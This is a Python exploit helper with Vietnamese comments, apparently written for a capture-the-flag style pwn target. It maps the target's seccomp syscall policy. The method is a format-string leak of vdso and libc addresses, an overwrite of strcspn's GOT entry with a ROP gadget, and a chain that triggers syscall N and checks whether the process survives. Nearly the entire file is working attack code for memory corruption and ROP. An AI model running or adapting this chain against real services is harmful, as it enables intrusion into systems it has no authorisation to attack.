#!/usr/bin/env python3
"""Do chinh sach seccomp cua dich: syscall N co song khong.

Chuoi (moi lan gui dung N byte de rax = N):
  strcspn@GOT -> `pop rdi; ret` (0x4014a1)
  buf[0x00]   -> vdso+0xa14  xor edx,ecx,esi,edi,r8d..r11d; ret   (giu nguyen rax)
  buf[0x08]   -> 0x4014a1    pop rdi; ret
  buf[0x10]   -> 0           (rdi = 0)
  buf[0x18]   -> write+0x12  syscall
  buf[0x20]   -> 0x40114f    dia chi ma libc `ret` se quay ve tiep tuc vong lap

Neu syscall duoc seccomp cho phep (ke ca khi loi EFAULT/EBADF) thi libc `ret`
dua ve 0x40114f -> tien trinh SONGLI va in 'score> '.
Neu seccomp KILL thi mat ket noi.
"""
import re
import sys
import time

sys.path.insert(0, "analysis")
sys.path.insert(0, "..")
from probe import Renderer
from exploit import (GOT_STRCSPN, GOT_WRITE, POP_RDI_RET, ZERO_AND_RET, multi_write,
                     read_int, leak_ptr, find_syscall, q)

BACK_TO_LOOP = 0x40114F
NAMES = {0: "read", 1: "write", 2: "open", 3: "close", 8: "lseek", 15: "rt_sigreturn",
         39: "getpid", 57: "fork", 59: "execve", 60: "exit", 62: "kill", 102: "getuid",
         231: "exit_group", 257: "openat"}


def probe(n):
    r = Renderer()
    r.drain()
    r.buf = b""
    vdso = read_int(r, b"%119$p")
    wa = leak_ptr(r, GOT_WRITE)
    sc = find_syscall(r, wa)
    r.render(multi_write([(GOT_STRCSPN, POP_RDI_RET)]))
    c = bytearray(n)
    for off, val in ((0x00, vdso + ZERO_AND_RET), (0x08, POP_RDI_RET),
                     (0x10, 0), (0x18, sc), (0x20, BACK_TO_LOOP)):
        if off + 8 <= n:
            c[off:off + 8] = q(val)
    try:
        r.s.sendall(bytes(c))
        time.sleep(1.0)
        r.buf = b""
        out = r._read(2.0)
        alive = b"score>" in out
    except Exception:
        alive = False
        out = b""
    r.close()
    return alive, out[:30]


if __name__ == "__main__":
    nums = [int(x) for x in sys.argv[1:]] or [39, 59, 257, 2, 0, 3, 8, 102, 15]
    for n in nums:
        alive, out = probe(n)
        print(f"  syscall {n:4d} ({NAMES.get(n,'?'):12s}) -> {'SONG  ' if alive else 'CHET'} {out!r}")
